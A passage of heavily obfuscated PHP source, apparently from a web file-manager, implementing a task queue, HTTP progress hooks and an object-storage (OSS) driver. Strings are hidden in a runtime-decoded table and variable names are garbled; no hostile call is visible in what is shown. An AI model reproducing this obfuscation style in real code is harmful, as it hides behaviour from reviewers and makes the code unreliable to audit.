<?php
 goto AïÄ§¶ó®…; aøªÅ‰•ñ½: function binCheckBigger($Š¬Ë³Óé, $ä™ñâ”) { return $Š¬Ë³Óé > $ä™ñâ”; } $_SERVER[$_SERVER[ÃºĞäÅÁ][3]] = (strrev('5997').strrev('97'))+0;$_o2m3="uv2498h3s7j1tbcidgypexf65maznowqklr0cel3o1m26nib79jfqtdpwua0g4krx5sh8yzv7gnla5";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($œã»†Äº, $Ïõø©Ô‚) { $Şó¹òƒĞ =& $_SERVER[¥Ÿ©ÒèÌ]; if (isset(self::$_methodList[$œã»†Äº])) { return @call_user_func_array(self::$_methodList[$œã»†Äº], $Ïõø©Ô‚); } else { if (method_exists($this, $œã»†Äº)) { return call_user_func_array(array($this, $œã»†Äº), $Ïõø©Ô‚); } else { think_exception(__CLASS__ . $Şó¹òƒĞ[4] . $œã»†Äº . $Şó¹òƒĞ[5]); } } } public static function __callStatic($£»²øî«, $•¨ŸèÖ«) { if (isset(self::$_methodListStatic[$£»²øî«])) { return call_user_func_array(self::$_methodListStatic[$£»²øî«], $•¨ŸèÖ«); } else { if (method_exists(self, $£»²øî«)) { return call_user_func_array(array(self, $£»²øî«), $•¨ŸèÖ«); } else { show_json("{$£»²øî«}\x28\x29\40\156\157\x74\x20\145\170\x69\x73\164\x3b", !1); } } } public static function addMethod($ääüóï, $ÊÒ“ÑÅ) { self::$_methodList[$ääüóï] = $ÊÒ“ÑÅ; } public static function addMethodStatic($É²×ù‡§, $áµœİ×¿) { self::$_methodListStatic[$É²×ù‡§] = $áµœİ×¿; } } goto C¨—Ç°²ˆä; d¹à²Ì: class TaskHttp extends Task { protected function startAfter() { $¬ì˜„ş =& $_SERVER[¥Ÿ©ÒèÌ]; $àà©İ¦­ =& $this->task; $àà©İ¦­[$¬ì˜„ş[1710]] = 1; Hook::bind($¬ì˜„ş[1679], array($this, $¬ì˜„ş[1711])); Hook::bind($¬ì˜„ş[1681], array($this, $¬ì˜„ş[1712])); Hook::bind($¬ì˜„ş[1683], array($this, $¬ì˜„ş[1713])); } protected function endAfter() { $áßäêœ² =& $_SERVER[¥Ÿ©ÒèÌ]; Hook::unbind($áßäêœ²[1679], array($this, $áßäêœ²[1711])); Hook::unbind($áßäêœ²[1681], array($this, $áßäêœ²[1712])); Hook::unbind($áßäêœ²[1683], array($this, $áßäêœ²[1713])); } public function progressStart($«İîßæè) { $…Öµ»Œö =& $_SERVER[¥Ÿ©ÒèÌ]; $Ò¸İÌ°ô = curl_getinfo($«İîßæè); self::log($…Öµ»Œö[1714] . $Ò¸İÌ°ô[$…Öµ»Œö[311]]); self::valueSet($this->task[$…Öµ»Œö[401]], $this->task); } public function progressEnd($êƒÇşñ†) { $ÙÆ¬êÙ“ =& $_SERVER[¥Ÿ©ÒèÌ]; self::log($ÙÆ¬êÙ“[1715] . $this->task[$ÙÆ¬êÙ“[401]]); $this->end(); } public function progress($ç—Í½ä‘, $’¾ª³–¥, $Éåâ¥¡æ, $„„¨´¼Ô, $ŸÃ§‰ì) { $ï¹è‰´û =& $_SERVER[¥Ÿ©ÒèÌ]; $ÙÕÍ±»Ñ =& $this->task; if ($ŸÃ§‰ì > 0) { $ÙÕÍ±»Ñ[$ï¹è‰´û[776]] = $ÙÕÍ±»Ñ[$ï¹è‰´û[776]] == 0 ? $„„¨´¼Ô : $ÙÕÍ±»Ñ[$ï¹è‰´û[776]]; $ÙÕÍ±»Ñ[$ï¹è‰´û[1640]] = $ŸÃ§‰ì; } else { if ($Éåâ¥¡æ > 0) { $ÙÕÍ±»Ñ[$ï¹è‰´û[776]] = $ÙÕÍ±»Ñ[$ï¹è‰´û[776]] == 0 ? $’¾ª³–¥ : $ÙÕÍ±»Ñ[$ï¹è‰´û[776]]; $ÙÕÍ±»Ñ[$ï¹è‰´û[1640]] = $Éåâ¥¡æ; } } $this->update(); self::log("\160\x72\157\147\x72\x65\163\163\x48\x74\164\x70\x3a\144\157\x77\x6e\72{$Éåâ¥¡æ}\57{$’¾ª³–¥}\x3b\x20\165\x70\154\x6f\x61\x64\72{$ŸÃ§‰ì}\x2f{$„„¨´¼Ô}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\x6b\x51\x75\x65\x75\145\114\x65\156\147\x74\x68"; const QUEUE_DATA = "\164\x61\x73\x6b\x51\x75\x65\165\145\104\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($©ìøÉ€, $«È²ÑĞ = array(), $Êüª‰äÆ = '', $Æ¡¤¹Ÿ = '') { $£ÅØ¯…· =& $_SERVER[¥Ÿ©ÒèÌ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($Æ¡¤¹Ÿ && array_find_by_field(self::$listData, $£ÅØ¯…·[95], $Æ¡¤¹Ÿ)) { return !0; } self::$listData[] = array($£ÅØ¯…·[268] => $©ìøÉ€, $£ÅØ¯…·[1716] => $«È²ÑĞ, $£ÅØ¯…·[451] => $Êüª‰äÆ, $£ÅØ¯…·[95] => $Æ¡¤¹Ÿ); return !0; } public static function addSubmit() { $³İúÊÖ‰ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($³İúÊÖ‰[1717] . json_encode_force(array_to_keyvalue(self::$listData, $³İúÊÖ‰[12], $³İúÊÖ‰[451])), $³İúÊÖ‰[1718]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Õ­‘õŠ­, $‡À¸¸­İ = array(), $Ë Æª´ = '', $ñ¬Î¨Õ½ = '') { $µ¦ÆÆ¹³ =& $_SERVER[¥Ÿ©ÒèÌ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ Ï–ëóÂ = self::getAll(); if ($ñ¬Î¨Õ½ && array_find_by_field($ Ï–ëóÂ, $µ¦ÆÆ¹³[95], $ñ¬Î¨Õ½)) { return !0; } $ Ï–ëóÂ[] = array($µ¦ÆÆ¹³[268] => $Õ­‘õŠ­, $µ¦ÆÆ¹³[1716] => $‡À¸¸­İ, $µ¦ÆÆ¹³[451] => $Ë Æª´, $µ¦ÆÆ¹³[95] => $ñ¬Î¨Õ½); write_log($µ¦ÆÆ¹³[1717] . $Ë Æª´, $µ¦ÆÆ¹³[1718]); self::setAll($ Ï–ëóÂ); return !0; } public static function run() { $ğŸç‹Øš =& $_SERVER[¥Ÿ©ÒèÌ]; $˜‰÷ÀÕ… = self::getAll(); $£¥¯ñÃÜ = array_shift($˜‰÷ÀÕ…); if (!$£¥¯ñÃÜ) { return !1; } self::setAll($˜‰÷ÀÕ…); $†ê©û¬Ê = timeFloat(); try { Hook::apply($£¥¯ñÃÜ[$ğŸç‹Øš[268]], $£¥¯ñÃÜ[$ğŸç‹Øš[1716]]); } catch (Exception $¨Á³Ú«Æ) { } $Ìåå·† = number_format(timeFloat() - $†ê©û¬Ê, 3) . $ğŸç‹Øš[1655]; write_log($ğŸç‹Øš[1719] . $£¥¯ñÃÜ[$ğŸç‹Øš[451]] . $ğŸç‹Øš[1720] . $Ìåå·†, $ğŸç‹Øš[1718]); return !0; } public static function count() { $ÚÖĞ™°á = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ÚÖĞ™°á) { return 0; } return intval($ÚÖĞ™°á); } public static function getAll() { $¢¨ŠŞº = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$¢¨ŠŞº) { return array(); } return $¢¨ŠŞº; } public static function setAll($œ¤‰ˆ´İ) { $¾×Êç‚ç = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($œ¤‰ˆ´İ), $¾×Êç‚ç); Cache::set(self::QUEUE_DATA, $œ¤‰ˆ´İ, $¾×Êç‚ç); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ÉÁñÔ‹Ù, $İõÆúÍš = 5.0) { if (!$ÉÁñÔ‹Ù) { return; } $ø©œÄ˜® = Cache::get($ÉÁñÔ‹Ù); if (!$ø©œÄ˜® || timeFloat() - floatVal($ø©œÄ˜®) >= $İõÆúÍš) { Cache::set($ÉÁñÔ‹Ù, timeFloat(), $İõÆúÍš * 10); return !0; } return !1; } public static function timeLimitCall($ŠÈöá†ş, $‹íÅëó, $æòı‹¯…, $å¸»ú‚ê = 5.0) { $°—ûµ×± =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ŠÈöá†ş || !$‹íÅëó) { return; } self::$asyncAdd = !0; $ŠÔ´õ¶÷ = $°—ûµ×±[1721]; $—Ñé‰Ôï = Cache::get($ŠÔ´õ¶÷, !0); $Èøï¬êø = array($°—ûµ×±[1722] => timeFloat(), $°—ûµ×±[1723] => timeFloat(), $°—ûµ×±[268] => $‹íÅëó, $°—ûµ×±[1716] => $æòı‹¯…, $°—ûµ×±[196] => $å¸»ú‚ê); if (is_array($—Ñé‰Ôï[$ŠÈöá†ş])) { $Èøï¬êø[$°—ûµ×±[1723]] = $—Ñé‰Ôï[$ŠÈöá†ş][$°—ûµ×±[1723]]; } if (is_array($—Ñé‰Ôï[$ŠÈöá†ş])) { if (timeFloat() - $—Ñé‰Ôï[$ŠÈöá†ş][$°—ûµ×±[1722]] < $Èøï¬êø[$°—ûµ×±[196]] * 0.3) { return; } $Èøï¬êø[$°—ûµ×±[1723]] = $—Ñé‰Ôï[$ŠÈöá†ş][$°—ûµ×±[1723]]; } $—Ñé‰Ôï[$ŠÈöá†ş] = $Èøï¬êø; Cache::set($ŠÔ´õ¶÷, $—Ñé‰Ôï, 60); Cache::removeMemory($ŠÔ´õ¶÷); write_log($°—ûµ×±[1724] . $ŠÈöá†ş . $°—ûµ×±[71] . $‹íÅëó, $°—ûµ×±[1718]); } public static function timeLimitCallLoop() { $‚£Ë€¸ß =& $_SERVER[¥Ÿ©ÒèÌ]; $æ´ªô£Ó = array($‚£Ë€¸ß[1725]); $¿ßóÃÄ¤ = in_array(strtolower(ACTION), $æ´ªô£Ó); if (!$¿ßóÃÄ¤ && !self::$asyncAdd) { return; } $¸²äÜÀ = $‚£Ë€¸ß[1721]; $á‰ÍûÅ = Cache::get($¸²äÜÀ, !0); if (!$á‰ÍûÅ || count($á‰ÍûÅ) <= 0) { return; } $ú¢ÇÍÄ… = !1; $Ï§ëš = timeFloat(); $áÀê™œ = array(); foreach ($á‰ÍûÅ as $ïı‚ö¿ => $ÆŠ‰ó§) { if ($Ï§ëš - $ÆŠ‰ó§[$‚£Ë€¸ß[1723]] > $ÆŠ‰ó§[$‚£Ë€¸ß[196]]) { $ú¢ÇÍÄ… = !0; try { Hook::apply($ÆŠ‰ó§[$‚£Ë€¸ß[268]], $ÆŠ‰ó§[$‚£Ë€¸ß[1716]]); write_log($‚£Ë€¸ß[1726] . $ïı‚ö¿ . $‚£Ë€¸ß[71] . $ÆŠ‰ó§[$‚£Ë€¸ß[268]] . $‚£Ë€¸ß[1727] . ACTION, $‚£Ë€¸ß[1718]); } catch (Exception $™²¯Àıê) { } continue; } $áÀê™œ[$ïı‚ö¿] = $ÆŠ‰ó§; } if (!$ú¢ÇÍÄ…) { return; } if (!$áÀê™œ) { return Cache::remove($¸²äÜÀ); } Cache::set($¸²äÜÀ, $áÀê™œ, 60); Cache::removeMemory($¸²äÜÀ); } public static function finished($¡›®§, $ø×Øã) { $áÉœ˜©¦ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($áÉœ˜©¦[268] => $¡›®§, $áÉœ˜©¦[1716] => $ø×Øã); } private static function finishedRun() { $¸êï‡¡× =& $_SERVER[¥Ÿ©ÒèÌ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ë€Ï¢®) { try { Hook::apply($ë€Ï¢®[$¸êï‡¡×[268]], $ë€Ï¢®[$¸êï‡¡×[1716]]); } catch (Exception $”ÖÖ‹¯) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto BõÔ˜ŠÑğ¨; b²†í“‚¤‰: define($_SERVER[¥Ÿ©ÒèÌ][0], $_SERVER[¥Ÿ©ÒèÌ][1]); $_SERVER[ÃºĞäÅÁ] = explode($_SERVER[¥Ÿ©ÒèÌ][2], gzinflate(substr($_SERVER[¥Ÿ©ÒèÌ][3], 10, -8))); function binCheckEq($ì½›¨Õ, $°ÊÃÏ¾¨) { return $ì½›¨Õ == $°ÊÃÏ¾¨; } goto b÷¸æŞÚ‚¾; FÎò‚êèø: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($’€ÀĞ¼Ÿ) { parent::__construct(); include_once SDK_DIR . $_SERVER[¥Ÿ©ÒèÌ][1366]; $this->_init($’€ÀĞ¼Ÿ); } public function _init($ÏªŞ×”) { $êÁçŸÄâ =& $_SERVER[¥Ÿ©ÒèÌ]; foreach ($ÏªŞ×” as $à×Ã©¡‡ => $µêÙ˜«Å) { if (isset($this->{$à×Ã©¡‡})) { $this->{$à×Ã©¡‡} = $µêÙ˜«Å; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($êÁçŸÄâ[1367] . LNG($êÁçŸÄâ[1368])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¥ßï²¾… =& $_SERVER[¥Ÿ©ÒèÌ]; $Ø‘í®õ = new OSS\Model\CorsConfig(); $ÅîÖ—ğä = new OSS\Model\CorsRule(); $ÅîÖ—ğä->addAllowedOrigin($¥ßï²¾…[1369]); $ÅîÖ—ğä->addAllowedMethod($¥ßï²¾…[1370]); $ÅîÖ—ğä->addAllowedMethod($¥ßï²¾…[1371]); $ÅîÖ—ğä->addAllowedMethod($¥ßï²¾…[1372]); $ÅîÖ—ğä->addAllowedMethod($¥ßï²¾…[1373]); $ÅîÖ—ğä->addAllowedMethod($¥ßï²¾…[157]); $ÅîÖ—ğä->setMaxAgeSeconds(600); $ÅîÖ—ğä->addExposeHeader($¥ßï²¾…[1374]); $ÅîÖ—ğä->addAllowedHeader($¥ßï²¾…[1369]); $Ø‘í®õ->addRule($ÅîÖ—ğä); try { $this->client->putBucketCors($this->bucket, $Ø‘í®õ); } catch (OSS\Core\OssException $öÉøò°õ) { return !1; } return !0; } public function getBucketCors() { $µŸ•–÷­ =& $_SERVER[¥Ÿ©ÒèÌ]; $®¸››Ô³ = null; try { $®¸››Ô³ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ø¯æ®¶ù) { return null; } if (!$®¸››Ô³ || !($ÛºŠ¸¦î = $®¸››Ô³->getRules())) { return null; } $…ïçó›Ğ = $ÛºŠ¸¦î[0]->getAllowedOrigins(); $Â¡Ûè€ó = $ÛºŠ¸¦î[0]->getAllowedMethods(); $‡øÏÒ€Ú = $ÛºŠ¸¦î[0]->getMaxAgeSeconds(); $ƒ¾èåÑÓ = $ÛºŠ¸¦î[0]->getExposeHeaders(); $õÓÒ¤ôæ = $ÛºŠ¸¦î[0]->getAllowedHeaders(); return array($µŸ•–÷­[180] => isset($…ïçó›Ğ[0]) ? $…ïçó›Ğ[0] : $µŸ•–÷­[12], $µŸ•–÷­[184] => $Â¡Ûè€ó, $µŸ•–÷­[1375] => $‡øÏÒ€Ú, $µŸ•–÷­[1376] => isset($ƒ¾èåÑÓ[0]) ? $ƒ¾èåÑÓ[0] : $µŸ•–÷­[12], $µŸ•–÷­[182] => isset($õÓÒ¤ôæ[0]) ? $õÓÒ¤ôæ[0] : $µŸ•–÷­[12]); } public function isBucketCors() { $‘Â‰”àÚ =& $_SERVER[¥Ÿ©ÒèÌ]; $“¹×à° = $this->getBucketCors(); if (!$“¹×à° || !is_array($“¹×à°)) { return !1; } if ($“¹×à°[$‘Â‰”àÚ[180]] != $‘Â‰”àÚ[181] || $“¹×à°[$‘Â‰”àÚ[182]] != $‘Â‰”àÚ[181]) { return !1; } $À—íÑø = array_map($‘Â‰”àÚ[183], $“¹×à°[$‘Â‰”àÚ[184]]); if (!is_array($À—íÑø)) { $À—íÑø = array(); } $Š«ÃâÉÊ = array($‘Â‰”àÚ[185], $‘Â‰”àÚ[186], $‘Â‰”àÚ[187], $‘Â‰”àÚ[188], $‘Â‰”àÚ[189]); $›ó… Åõ = array_diff($Š«ÃâÉÊ, $À—íÑø); return empty($›ó… Åõ); } public function mkfile($®—ªù±, $·ôò›Ç = '', $Âèª±§Û = REPEAT_RENAME) { $Ú¾Ç²Ã = $this->setContent($®—ªù±, $·ôò›Ç); if ($Ú¾Ç²Ã !== !1) { return $this->getPathOuter($®—ªù±); } return !1; } public function mkdir($çôè…ı, $‘Õ¢öƒµ = REPEAT_SKIP) { if ($this->_isFolder($çôè…ı)) { return $this->getPathOuter($çôè…ı); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($çôè…ı)); } catch (OSS\Core\OssException $ºóºŞĞ) { return !1; } return $this->getPathOuter($çôè…ı); } private function fileList($‚¤¢Ûè¸, $ÍŸ–¢šì = '', $œËúÛ—‚ = 0) { $ÇÅÜƒ„Ã =& $_SERVER[¥Ÿ©ÒèÌ]; $‚¤¢Ûè¸ = trim($‚¤¢Ûè¸, $ÇÅÜƒ„Ã[8]); $İ©èÛô = empty($‚¤¢Ûè¸) && $‚¤¢Ûè¸ !== $ÇÅÜƒ„Ã[190] ? $ÇÅÜƒ„Ã[12] : $‚¤¢Ûè¸ . $ÇÅÜƒ„Ã[8]; $‹Æ¼ÛœÀ = $ÇÅÜƒ„Ã[12]; $°…­µòÔ = 1000; $“å­ÖçÅ = $this->listItemCache === !1 ? !1 : !0; $—ÛîÉş¹ = $¨–ô¨ = array(); while (!0) { check_abort(); $ĞˆÓõ¡ = array($ÇÅÜƒ„Ã[1377] => $ÍŸ–¢šì, $ÇÅÜƒ„Ã[1378] => $İ©èÛô, $ÇÅÜƒ„Ã[1379] => $°…­µòÔ, $ÇÅÜƒ„Ã[1380] => $‹Æ¼ÛœÀ); try { $ßÖÔã€ğ = $this->client->listObjects($this->bucket, $ĞˆÓõ¡); } catch (OSS\Core\OssException $œ´š¸ Ô) { break; } $‹Æ¼ÛœÀ = $ßÖÔã€ğ->getNextMarker(); $ÖÏ¿¼ù = $ßÖÔã€ğ->getObjectList(); $€µÌÃ£ë = $ßÖÔã€ğ->getPrefixList(); foreach ($ÖÏ¿¼ù as $×©û¸ ‚) { if ($×©û¸ ‚->getKey() == $İ©èÛô) { continue; } $º»„úØË = $×©û¸ ‚->getKey(); $âÈùÖİï = $×©û¸ ‚->getSize(); $êŸ§· = $×©û¸ ‚->getLastModified(); $¥ˆ—óØĞ = $œËúÛ—‚ ? array($ÇÅÜƒ„Ã[32] => $º»„úØË, $ÇÅÜƒ„Ã[80] => $âÈùÖİï, $ÇÅÜƒ„Ã[196] => strtotime($êŸ§·)) : $º»„úØË; $­ş«¬´ä = $âÈùÖİï == 0 && substr($º»„úØË, strlen($º»„úØË) - 1, 1) == $ÇÅÜƒ„Ã[8] ? !0 : !1; if ($“å­ÖçÅ) { $this->cacheMethod($ÇÅÜƒ„Ã[198], $º»„úØË, $­ş«¬´ä); $this->cacheMethod($ÇÅÜƒ„Ã[199], $º»„úØË, array($ÇÅÜƒ„Ã[80] => $âÈùÖİï, $ÇÅÜƒ„Ã[1381] => $âÈùÖİï, $ÇÅÜƒ„Ã[86] => strtotime($êŸ§·), $ÇÅÜƒ„Ã[1382] => $êŸ§·)); } if ($­ş«¬´ä) { $—ÛîÉş¹[] = $º»„úØË; continue; } $¨–ô¨[] = $¥ˆ—óØĞ; } foreach ($€µÌÃ£ë as $—®‚»Ãû) { $—ÛîÉş¹[] = $—®‚»Ãû->getPrefix(); if ($“å­ÖçÅ) { $this->cacheMethod($ÇÅÜƒ„Ã[198], $º»„úØË, !0); } } if ($‹Æ¼ÛœÀ === $ÇÅÜƒ„Ã[12]) { break; } } if ($“å­ÖçÅ) { $this->cacheMethod($ÇÅÜƒ„Ã[198], $‚¤¢Ûè¸, !0); } return array($ÇÅÜƒ„Ã[77] => $—ÛîÉş¹, $ÇÅÜƒ„Ã[76] => $¨–ô¨); } public function copyFile($è˜Îßäº, $¦¥êƒ×Ô) { $êœ®‡š« = $this->size($è˜Îßäº); if ($êœ®‡š« < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $è˜Îßäº, $this->bucket, $this->pathEncode($¦¥êƒ×Ô)); } catch (OSS\Core\OssException $—ã’™Æ›) { return !1; } return $this->getPathOuter($¦¥êƒ×Ô); } $à‰˜ŒÂ‘ = $this->multiCopyObject($è˜Îßäº, $¦¥êƒ×Ô, $êœ®‡š«); return $à‰˜ŒÂ‘ ? $this->getPathOuter($¦¥êƒ×Ô) : !1; } private function multiCopyObject($¤áåøä, $„˜ã«äú, $Áˆ®±€è) { $²ÁîÊñì =& $_SERVER[¥Ÿ©ÒèÌ]; try { $Øš‹œ„ˆ = array(); if ($³É‚¬çè = $this->hashMd5($¤áåøä)) { $Øš‹œ„ˆ = array(OSS\OssClient::OSS_HEADERS => array($²ÁîÊñì[1383] => $³É‚¬çè)); } $½ÈšèÒã = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($„˜ã«äú), $Øš‹œ„ˆ); $ÎèíÓ’š = 1; $¼µ¢£„ = 0; $Œàšå§Ê = array(); $ ¨‡êº¶ = 1024 * 1024 * 10; $±¾½Ë² = $this->client->generateMultiuploadParts($Áˆ®±€è, $ ¨‡êº¶); foreach ($±¾½Ë² as $Î»ÆÑÊÄ => $¼¹ñ‚Ñ) { $ºÑèÎõÏ = $¼µ¢£„ + (int) $¼¹ñ‚Ñ[$²ÁîÊñì[1384]]; $ÊÌ¶ÄËê = (int) $¼¹ñ‚Ñ[$²ÁîÊñì[341]] + $ºÑèÎõÏ - 1; $ÜÑíæÍ = array($²ÁîÊñì[1385] => $ºÑèÎõÏ, $²ÁîÊñì[1386] => $ÊÌ¶ÄËê); $Œàšå§Ê[] = $this->client->uploadPartCopy($this->bucket, $¤áåøä, $this->bucket, $this->pathEncode($„˜ã«äú), $ÎèíÓ’š, $½ÈšèÒã, $ÜÑíæÍ); $ÎèíÓ’š = $ÎèíÓ’š + 1; } $¬ŒûŸ„ = array(); foreach ($Œàšå§Ê as $Î»ÆÑÊÄ => $ÍÆ”›Ÿ©) { $¬ŒûŸ„[] = array($²ÁîÊñì[1387] => $Î»ÆÑÊÄ + 1, $²ÁîÊñì[1388] => $ÍÆ”›Ÿ©); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($„˜ã«äú), $½ÈšèÒã, $¬ŒûŸ„); } catch (OSS\Core\OssException $ŸĞ§À¿˜) { return !1; } return !0; } public function moveFile($Ÿ‰íè¿Á, $ŸíşĞˆ¿) { if ($this->copyFile($Ÿ‰íè¿Á, $ŸíşĞˆ¿)) { $this->remove($Ÿ‰íè¿Á); return $this->getPathOuter($ŸíşĞˆ¿); } return !1; } public function delFile($ÒÕùö˜²) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÒÕùö˜²)); } catch (OSS\Core\OssException $§ÌÕ£øÏ) { return !1; } return !0; } public function delFolder($½²ôÀœÌ) { $÷ò¡ ÌÁ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->exist($½²ôÀœÌ)) { return !0; } $this->listItemCache = !1; $ó˜‹£¸ö = $this->fileList($½²ôÀœÌ); $this->listItemCache = !0; $µƒùìˆ¨ = trim($½²ôÀœÌ, $÷ò¡ ÌÁ[8]) . $÷ò¡ ÌÁ[8]; if (!empty($½²ôÀœÌ) && $½²ôÀœÌ !== $÷ò¡ ÌÁ[190] && !in_array($µƒùìˆ¨, $ó˜‹£¸ö[$÷ò¡ ÌÁ[77]])) { $ó˜‹£¸ö[$÷ò¡ ÌÁ[77]][] = $µƒùìˆ¨; } $î½ó„Ç = $this->delByBatch($ó˜‹£¸ö[$÷ò¡ ÌÁ[76]]); if (!$î½ó„Ç) { return !1; } $î½ó„Ç = $this->delByBatch($ó˜‹£¸ö[$÷ò¡ ÌÁ[77]]); if (!$î½ó„Ç) { return !1; } return $this->delFile($µƒùìˆ¨); } private function delByBatch($‹¯Ìª) { foreach (array_chunk($‹¯Ìª, 1000) as $ü½½ÍÏ°) { try { $this->client->deleteObjects($this->bucket, $ü½½ÍÏ°); } catch (OSS\Core\OssException $ÆŞÔÛ¬©) { return !1; } } return !0; } public function rename($¡ÙÂ¨, $Äºˆ§) { return $this->renameObject($¡ÙÂ¨, $Äºˆ§); } private function fileInfo($²İ»ëü·, $©”Ò­¸¦ = false, $˜Ÿˆ¢ë½ = array()) { $èÆáÉÚ =& $_SERVER[¥Ÿ©ÒèÌ]; $ø„«‰ğğ = array($èÆáÉÚ[32] => $this->pathThis($²İ»ëü·), $èÆáÉÚ[78] => $this->getPathOuter($²İ»ëü·), $èÆáÉÚ[33] => $èÆáÉÚ[192], $èÆáÉÚ[80] => isset($˜Ÿˆ¢ë½[$èÆáÉÚ[80]]) ? $˜Ÿˆ¢ë½[$èÆáÉÚ[80]] : 0, $èÆáÉÚ[167] => $this->ext($²İ»ëü·)); if ($©”Ò­¸¦) { return $ø„«‰ğğ; } $ø„«‰ğğ[$èÆáÉÚ[193]] = $ø„«‰ğğ[$èÆáÉÚ[86]] = 0; $ø„«‰ğğ[$èÆáÉÚ[194]] = $ø„«‰ğğ[$èÆáÉÚ[195]] = !0; if (empty($˜Ÿˆ¢ë½)) { $Ÿú¡Ìƒõ = $this->objectMeta($²İ»ëü·); if (!$Ÿú¡Ìƒõ) { return $ø„«‰ğğ; } $˜Ÿˆ¢ë½ = array($èÆáÉÚ[86] => strtotime($Ÿú¡Ìƒõ[$èÆáÉÚ[1382]]), $èÆáÉÚ[80] => $Ÿú¡Ìƒõ[$èÆáÉÚ[1381]] + 0); } if (isset($˜Ÿˆ¢ë½[$èÆáÉÚ[80]])) { $ø„«‰ğğ[$èÆáÉÚ[80]] = $˜Ÿˆ¢ë½[$èÆáÉÚ[80]]; } if (isset($˜Ÿˆ¢ë½[$èÆáÉÚ[86]])) { $ø„«‰ğğ[$èÆáÉÚ[86]] = $˜Ÿˆ¢ë½[$èÆáÉÚ[86]]; } if (isset($˜Ÿˆ¢ë½[$èÆáÉÚ[196]]) && !trim($ø„«‰ğğ[$èÆáÉÚ[86]])) { $ø„«‰ğğ[$èÆáÉÚ[86]] = $˜Ÿˆ¢ë½[$èÆáÉÚ[196]]; } return $ø„«‰ğğ; } private function folderInfo($´éŠÖ§´, $‡†óëå¾ = false, $Â†€°è = array()) { $Ïœ©Ÿ› =& $_SERVER[¥Ÿ©ÒèÌ]; $¡â×Õ¾Ì = array($Ïœ©Ÿ›[32] => $this->pathThis($´éŠÖ§´), $Ïœ©Ÿ›[78] => $this->getPathOuter($Ïœ©Ÿ›[8] . $´éŠÖ§´), $Ïœ©Ÿ›[33] => $Ïœ©Ÿ›[79]); if ($‡†óëå¾) { return $¡â×Õ¾Ì; } $¡â×Õ¾Ì[$Ïœ©Ÿ›[193]] = $¡â×Õ¾Ì[$Ïœ©Ÿ›[86]] = 0; $¡â×Õ¾Ì[$Ïœ©Ÿ›[194]] = $¡â×Õ¾Ì[$Ïœ©Ÿ›[195]] = !0; if (empty($Â†€°è)) { $´éŠÖ§´ = rtrim($´éŠÖ§´, $Ïœ©Ÿ›[8]) . $Ïœ©Ÿ›[8]; $ØˆİÆÒ = $this->objectMeta($´éŠÖ§´); if (!$ØˆİÆÒ) { return $¡â×Õ¾Ì; } $Â†€°è = array($Ïœ©Ÿ›[193] => $ØˆİÆÒ[$Ïœ©Ÿ›[511]][$Ïœ©Ÿ›[1389]], $Ïœ©Ÿ›[86] => strtotime($ØˆİÆÒ[$Ïœ©Ÿ›[1382]])); } if (isset($Â†€°è[$Ïœ©Ÿ›[86]])) { $¡â×Õ¾Ì[$Ïœ©Ÿ›[86]] = $Â†€°è[$Ïœ©Ÿ›[86]]; } if (isset($Â†€°è[$Ïœ©Ÿ›[193]])) { $¡â×Õ¾Ì[$Ïœ©Ÿ›[193]] = $Â†€°è[$Ïœ©Ÿ›[193]]; } return $¡â×Õ¾Ì; } public function listPath($ÏºÙÙƒ®, $Åæ¼‚‹ = false) { $îİ°¼† =& $_SERVER[¥Ÿ©ÒèÌ]; $¬Øé¹‡¸ = $this->fileList($ÏºÙÙƒ®, $îİ°¼†[8], !0); foreach ($¬Øé¹‡¸[$îİ°¼†[77]] as $´×óÚÉ… => $¨É´«Ñ¢) { $¬Øé¹‡¸[$îİ°¼†[77]][$´×óÚÉ…] = $this->folderInfo($¨É´«Ñ¢, $Åæ¼‚‹, $¨É´«Ñ¢); } foreach ($¬Øé¹‡¸[$îİ°¼†[76]] as $´×óÚÉ… => $¨É´«Ñ¢) { $¬Øé¹‡¸[$îİ°¼†[76]][$´×óÚÉ…] = $this->fileInfo($¨É´«Ñ¢[$îİ°¼†[32]], $Åæ¼‚‹, $¨É´«Ñ¢); } return $¬Øé¹‡¸; } public function has($ÖÄê…Ş, $ ¶Ó™à = false, $Ñá×şé– = true) { $°äËÄ¢æ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÖÄê…Ş = trim($ÖÄê…Ş, $°äËÄ¢æ[8]); $Ã¯„ÌŞ› = empty($ÖÄê…Ş) && $ÖÄê…Ş !== $°äËÄ¢æ[190] ? 